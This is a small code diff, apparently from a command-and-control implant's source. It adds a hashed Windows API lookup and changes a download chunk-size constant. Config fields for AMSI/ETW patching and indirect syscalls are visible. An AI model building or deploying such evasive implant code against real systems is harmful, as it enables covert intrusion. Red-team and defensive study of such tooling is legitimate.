@@ -406,6 +406,7 @@ VOID DemonInit( PVOID ModuleInst, PKAYN_ARGS KArgs )
         Instance.Win32.GetFullPathNameW                = LdrFunctionAddr( Instance.Modules.Kernel32, H_FUNC_GETFULLPATHNAMEW );
         Instance.Win32.CreateFileW                     = LdrFunctionAddr( Instance.Modules.Kernel32, H_FUNC_CREATEFILEW );
         Instance.Win32.GetFileSize                     = LdrFunctionAddr( Instance.Modules.Kernel32, H_FUNC_GETFILESIZE );
+        Instance.Win32.GetFileSizeEx                   = LdrFunctionAddr( Instance.Modules.Kernel32, H_FUNC_GETFILESIZEEX );
         Instance.Win32.CreateNamedPipeW                = LdrFunctionAddr( Instance.Modules.Kernel32, H_FUNC_CREATENAMEDPIPEW );
         Instance.Win32.ConvertFiberToThread            = LdrFunctionAddr( Instance.Modules.Kernel32, H_FUNC_CONVERTFIBERTOTHREAD );
         Instance.Win32.CreateFiberEx                   = LdrFunctionAddr( Instance.Modules.Kernel32, H_FUNC_CREATEFIBEREX );
@@ -614,7 +615,7 @@ VOID DemonConfig()
     Instance.Config.Implant.ProxyLoading       = ParserGetInt32( &Parser );
     Instance.Config.Implant.SysIndirect        = ParserGetInt32( &Parser );
     Instance.Config.Implant.AmsiEtwPatch       = ParserGetInt32( &Parser );
-    Instance.Config.Implant.DownloadChunkSize  = 512000; /* 512k by default. */
+    Instance.Config.Implant.DownloadChunkSize  = 0x80000; /* 512k by default. */
 
     PRINTF(
         "[CONFIG] Sleep Obfuscation: \n"
